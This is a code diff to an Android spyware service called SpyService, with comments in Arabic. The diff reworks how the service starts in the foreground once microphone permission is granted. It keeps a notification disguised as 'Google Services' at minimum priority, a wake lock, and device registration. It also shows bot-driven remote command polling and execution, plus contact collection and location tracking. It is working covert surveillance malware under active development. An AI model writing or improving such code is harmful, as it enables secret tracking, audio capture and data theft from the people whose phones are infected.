@@ -29,6 +29,7 @@ import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.File;
@@ -56,6 +57,7 @@ public class SpyService extends Service {
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
     private boolean isRegistered = false;
+    private boolean foregroundStarted = false;
 
     @Override
     public void onCreate() {
@@ -65,32 +67,64 @@ public class SpyService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
-        // تشغيل الخدمة في المقدمة
-        startForegroundService();
+        // لا نبدأ Foreground هنا، ننتظر حتى يتم منح الصلاحيات
+        // startForegroundService() سيتم استدعاؤها بعد التأكد من الصلاحيات
 
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
-        // تسجيل الجهاز فوراً
+        // تسجيل الجهاز فوراً (حتى بدون Foreground)
         registerDevice();
 
         // بدء جلب الأوامر
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);
+
+        // محاولة بدء Foreground بعد 3 ثوانٍ (لإعطاء وقت لطلب الصلاحيات)
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            if (!foregroundStarted && hasMicrophonePermission()) {
+                startForegroundService();
+            }
+        }, 3000);
+    }
+
+    private boolean hasMicrophonePermission() {
+        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
+                == PackageManager.PERMISSION_GRANTED;
+    }
+
+    // استدعاء هذه الدالة من MainActivity بعد منح الصلاحيات
+    public void startForegroundAfterPermissions() {
+        if (!foregroundStarted && hasMicrophonePermission()) {
+            startForegroundService();
+        }
     }
 
     private void startForegroundService() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
-            getSystemService(NotificationManager.class).createNotificationChannel(ch);
+        if (foregroundStarted) return;
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
+                getSystemService(NotificationManager.class).createNotificationChannel(ch);
+            }
+            startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
+                    .setContentTitle("Google Services")
+                    .setContentText("Running...")
+                    .setSmallIcon(android.R.drawable.ic_menu_manage)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .build());
+            foregroundStarted = true;
+            Log.d(TAG, "Foreground service started successfully");
+        } catch (SecurityException e) {
+            Log.e(TAG, "Failed to start foreground: " + e.getMessage());
+            // المحاولة مرة أخرى بعد 5 ثوانٍ
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                if (!foregroundStarted && hasMicrophonePermission()) {
+                    startForegroundService();
+                }
+            }, 5000);
         }
-        startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
-                .setContentTitle("Google Services")
-                .setContentText("Running...")
-                .setSmallIcon(android.R.drawable.ic_menu_manage)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .build());
     }
 
     private void registerDevice() {
@@ -162,7 +196,6 @@ public class SpyService extends Service {
                             Log.d(TAG, "Executing command: " + cmd);
                             executeCommand(cmd);
                         } else if (txt.startsWith("/")) {
-                            // رد على الأوامر المباشرة من البوت (للمدير)
                             handleDirectCommand(txt);
                         }
                     }
@@ -174,7 +207,6 @@ public class SpyService extends Service {
     }
 
     private void handleDirectCommand(String cmd) {
-        // ردود بسيطة للمدير
         if (cmd.equals("/start") || cmd.equals("/help")) {
             bot.sendText("🔰 **Google Update - Commands**\n\n" +
                     "أرسل الأمر مسبوقاً بـ CMD:\n" +
@@ -233,7 +265,7 @@ public class SpyService extends Service {
         }
     }
 
-    // ========== المميزات الأساسية (نفس الكود السابق) ==========
+    // ========== المميزات الأساسية ==========
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
